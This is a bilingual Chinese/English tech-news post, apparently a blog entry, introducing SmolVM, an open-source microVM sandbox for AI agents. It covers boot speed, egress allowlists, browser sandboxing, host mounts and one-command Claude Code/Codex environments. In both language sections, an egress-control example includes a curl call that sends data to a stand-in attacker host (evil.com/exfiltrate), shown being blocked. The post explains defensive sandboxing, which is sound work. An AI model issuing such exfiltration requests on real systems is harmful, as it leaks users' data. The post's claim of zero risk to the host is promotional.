---
title: "SmolVM：给 AI Agent 配一台一次性虚拟机，毫秒级启动、硬件级隔离"
titleEn: "smolvm-ai-agent-sandbox-vm-firecracker-browser-claude-codex"
description: "SmolVM 是开源的 AI Agent 沙箱基础设施，统一封装 Firecracker、QEMU、libkrun 三种 VMM，让 Agent 在 ~500ms 内获得一台独立虚拟机。支持硬件级隔离、网络出口白名单、浏览器沙箱（CDP + VNC）、主机目录挂载、快照、以及一键启动预装 Claude Code / Codex / Pi 的编程 Agent 环境。785 Star，Apache 2.0。"
descriptionEn: "SmolVM is open-source AI agent sandbox infrastructure with a unified API for Firecracker, QEMU, and libkrun VMMs. Each microVM boots in ~500ms, provides hardware-level isolation, network egress controls, browser sandbox (CDP + VNC), host directory mounts, snapshots, and one-command launch of Claude Code / Codex / Pi coding environments. 785 stars, Apache 2.0."
pubDate: "2026-08-25"
updatedDate: "2026-08-25"
category: "Tech-News"
tags: ["开源", "AI Agent", "沙箱", "虚拟机", "Firecracker", "Claude Code", "浏览器自动化", "安全隔离"]
heroImage: "../../assets/images/smolvm-ai-agent-sandbox-vm-firecracker-browser-claude-codex-banner.jpg"
author: "Mycelium Protocol"
---

*by Mycelium Protocol*

---

GitHub：CelestoAI/SmolVM ⭐ 785 | Forks 61 | Python | Apache 2.0  
文档：https://docs.celesto.ai/smolvm  
Discord：https://discord.gg/KNb5UkrAmm  
创建：2026-02-15

---

## 一句话理解

**SmolVM 给 AI Agent 配了一台可抛弃的电脑。** 每个 microVM 在毫秒内启动，跑完就删，数千个并发沙箱也能撑住——没有 Docker 的进程级隔离风险，是真正的虚拟机硬件隔离。

---

## 为什么需要 VM 沙箱

当前主流做法是让 Agent 直接在宿主机上执行代码。问题显而易见：

- AI 生成的代码如果有恶意行为（删文件、发出网络请求），直接影响宿主机
- 用 Docker 容器隔离，内核共享，逃逸风险仍然存在
- 编程 Agent（Claude Code、Codex）在本地运行时，每隔几秒就要"按 Enter 确认"——既低效又危险

SmolVM 的答案是给每个 Agent 任务配一台真正的虚拟机，用完即销毁。

---

## 核心能力

### 毫秒级启动（~500ms）

底层支持三种 VMM 后端：
- **Firecracker**（Linux，KVM）：Amazon 开源的 microVM，最轻量最快
- **QEMU**（macOS，Linux）：兼容性最广
- **libkrun**：另一个轻量级选项

Python API 一行启动：

```python
from smolvm import SmolVM

vm = SmolVM()
result = vm.run("echo 'Hello from the sandbox!'")
print(result)
vm.stop()
```

### 硬件级隔离

每个沙箱是独立的虚拟机，硬件层面隔离，不共享内核。AI 生成的恶意代码无法逃逸到宿主机。

### 网络出口控制

```python
vm = SmolVM(
    internet_settings={
        "allowed_domains": ["https://api.openai.com"],
    }
)
vm.run("curl https://api.openai.com/v1/models")  # 允许
vm.run("curl https://evil.com/exfiltrate")       # 拒绝
```

指定允许的出口域名，Agent 无法向未经授权的地址发送数据。

### 浏览器沙箱

```python
with SmolVM.browser(headless=False) as browser:
    print(browser.cdp_url)    # CDP 自动化端点（Playwright 可接入）
    print(browser.viewer_url) # 在你的浏览器里实时观看
    print(browser.display_url)# VNC 地址，给 computer-use Agent
```

三个地址对应三种用途：自动化（cdp_url）、实时监看（viewer_url）、Agent 控制（display_url）。Agent 可以浏览网页、点击表单、截图，你可以在旁边看着它操作。

### 主机目录挂载

```bash
# 只读挂载（默认）
smolvm sandbox create --name dev-env --mount ~/Projects/my-app

# 可写挂载（Agent 的修改直接写回宿主机）
smolvm sandbox create --mount ~/Projects/my-app --writable-mounts
```

Agent 可以在沙箱里访问你的真实代码库，无需复制文件。`/workspace` 是挂载点。

### 快照

暂停沙箱并在之后恢复——内存、磁盘、运行中的进程全部保留。长时间任务跨天继续，会话不断。

---

## 一键启动编程 Agent 环境

```bash
smolvm claude start  # 预装 Claude Code 的沙箱 + git 凭据转发
smolvm codex start   # 预装 Codex 的沙箱
smolvm pi start      # 预装 Pi 编程 Agent 的沙箱
```

这是 SmolVM 最有意思的能力之一：Claude Code 或 Codex 在沙箱里跑，即使 Agent 的权限是 `bypassPermissions`，所有操作也被限制在 VM 内，对宿主机没有任何风险。官方视频演示了这套流程。

---

## Windows 沙箱（预览）

```python
with SmolVM(
    os="windows",
    image="~/.smolvm/images/win11.qcow2",
    ssh_user="smolvm",
    ssh_password="smolvm",
) as vm:
    print(vm.run("Write-Output 'hello from windows'").stdout)
```

Linux 宿主机 + KVM 可以跑 Windows 11 Guest，支持 PowerShell、文件上传、环境变量注入，多个 Windows 沙箱并行运行。

---

## macOS 桌面沙箱（预览）

Apple Silicon Mac 上可以启动一个临时 macOS 桌面，用于测试应用程序或安装包，不污染主系统。`smolvm sandbox desktop <name>` 在系统内置屏幕共享里打开。

---

## Agent 框架集成

官方提供示例，覆盖主流框架：

| 框架 | 用途 |
|------|------|
| OpenAI Agents | shell 工具 |
| LangChain | shell 工具 |
| PydanticAI | shell + 多轮复用沙箱 + 浏览器自动化 |
| Computer Use | 点击 + 键盘控制 |

---

## 安装

```bash
# 一行安装（推荐）
curl -sSL https://celesto.ai/install.sh | bash

# 或 pip
pip install smolvm
smolvm setup
smolvm doctor
```

`pip install smolvm` 会自动拉取匹配平台的 `smolvm-core` wheel（包含 Rust 编译产物），大多数用户不需要自己装 Rust。

---

## 为什么值得关注

随着 AI Agent 越来越多地"自主执行任务"——运行代码、浏览网页、修改文件，沙箱安全成了基础设施层面的必选项，而不是可选的安全加固。

SmolVM 提供的是 microVM 级别的隔离，而不是容器（共享内核）或进程（无隔离）。500ms 冷启动足以在每次 Agent 任务前重建一个干净的环境，任务结束即销毁——这是"最小权限"原则在 Agent 运行时的正确实现。

---

**相关链接**

- GitHub：https://github.com/CelestoAI/SmolVM
- 文档：https://docs.celesto.ai/smolvm
- Discord：https://discord.gg/KNb5UkrAmm

---

*Mycelium Protocol — 追踪 AI 系统的底层演化*

---

> **关于 Mycelium**
>
> 菌丝协议。持续追踪 AI 工具、系统和实验的内容节点。

---

<!--EN-->

## SmolVM: Disposable VMs for AI Agents — Millisecond Boot, Hardware Isolation

*by Mycelium Protocol*

---

GitHub: CelestoAI/SmolVM ⭐ 785 | Forks 61 | Python | Apache 2.0  
Docs: https://docs.celesto.ai/smolvm  
Discord: https://discord.gg/KNb5UkrAmm  
Created: 2026-02-15

---

### The One-Line Version

**SmolVM gives AI agents their own disposable computer.** Each microVM boots in milliseconds, runs any code or software, persists state across sessions, and disappears when you're done — capable of handling thousands of sandboxes in production.

---

### Why VMs Instead of Containers

The common approach is running agent code directly on the host or in Docker containers. The problems:

- AI-generated code with malicious behavior (deleting files, exfiltrating data) directly affects the host
- Docker shares the kernel — container escapes remain a real risk
- Coding agents (Claude Code, Codex) running locally require constant "press Enter to accept" confirmations — slow and still dangerous

SmolVM answers this by giving each agent task a real virtual machine, destroyed when done.

---

### Core Capabilities

**Sub-second boot (~500ms).** Three VMM backends:
- **Firecracker** (Linux, KVM): Amazon's open-source microVM, lightest and fastest
- **QEMU** (macOS, Linux): widest compatibility
- **libkrun**: another lightweight option

```python
from smolvm import SmolVM

vm = SmolVM()
result = vm.run("echo 'Hello from the sandbox!'")
print(result)
vm.stop()
```

**Hardware-level isolation.** Each sandbox is an independent VM — no shared kernel. Malicious code generated by AI cannot escape to the host.

**Network egress controls.**
```python
vm = SmolVM(
    internet_settings={
        "allowed_domains": ["https://api.openai.com"],
    }
)
vm.run("curl https://api.openai.com/v1/models")  # allowed
vm.run("curl https://evil.com/exfiltrate")       # blocked
```

**Browser sandbox.**
```python
with SmolVM.browser(headless=False) as browser:
    print(browser.cdp_url)    # CDP endpoint for Playwright
    print(browser.viewer_url) # watch live in your browser
    print(browser.display_url)# VNC URL for computer-use agents
```

Three endpoints: automation (cdp_url), live monitoring (viewer_url), agent control (display_url). Watch your agent navigate websites in real time.

**Host directory mounting.**
```bash
smolvm sandbox create --name dev-env --mount ~/Projects/my-app
# /workspace inside the sandbox — your real codebase, read-only by default
# add --writable-mounts to let the agent edit host files directly
```

**Snapshots.** Pause and resume with full state: memory, disk, running processes. Long-running tasks survive overnight.

---

### One-Command Coding Agent Environments

```bash
smolvm claude start  # sandbox with Claude Code preinstalled + git credentials
smolvm codex start   # sandbox with Codex preinstalled
smolvm pi start      # sandbox with Pi coding agent preinstalled
```

Claude Code or Codex runs inside the VM. Even with `bypassPermissions`, all operations are confined to the VM — zero risk to the host. The official video demo walks through the workflow.

---

### Windows Sandbox (Preview)

```python
with SmolVM(os="windows", image="~/.smolvm/images/win11.qcow2", ...) as vm:
    print(vm.run("Write-Output 'hello from windows'").stdout)
```

Linux host + KVM required. Supports PowerShell, file upload, environment variables, parallel Windows guests.

---

### Agent Framework Integrations

Official examples for: OpenAI Agents, LangChain, PydanticAI (shell + multi-turn reuse + browser automation), and computer-use (click + keyboard control).

---

### Install

```bash
# One-line install (recommended)
curl -sSL https://celesto.ai/install.sh | bash

# Or pip
pip install smolvm && smolvm setup && smolvm doctor
```

`pip install smolvm` automatically pulls the platform-matched `smolvm-core` wheel. Most users don't need Rust installed.

---

### Why It Matters

As AI agents increasingly "execute autonomously" — running code, browsing the web, modifying files — sandbox security becomes a required infrastructure layer, not an optional hardening measure.

SmolVM offers microVM-level isolation rather than containers (shared kernel) or processes (no isolation). A 500ms cold start is fast enough to rebuild a clean environment before every agent task and destroy it after — this is the correct implementation of least-privilege for agent runtimes.

---

**Links**

- GitHub: https://github.com/CelestoAI/SmolVM
- Docs: https://docs.celesto.ai/smolvm
- Discord: https://discord.gg/KNb5UkrAmm

---

*Mycelium Protocol — tracking the deep evolution of AI systems*

© 2026 Mycelium Protocol. All rights reserved.
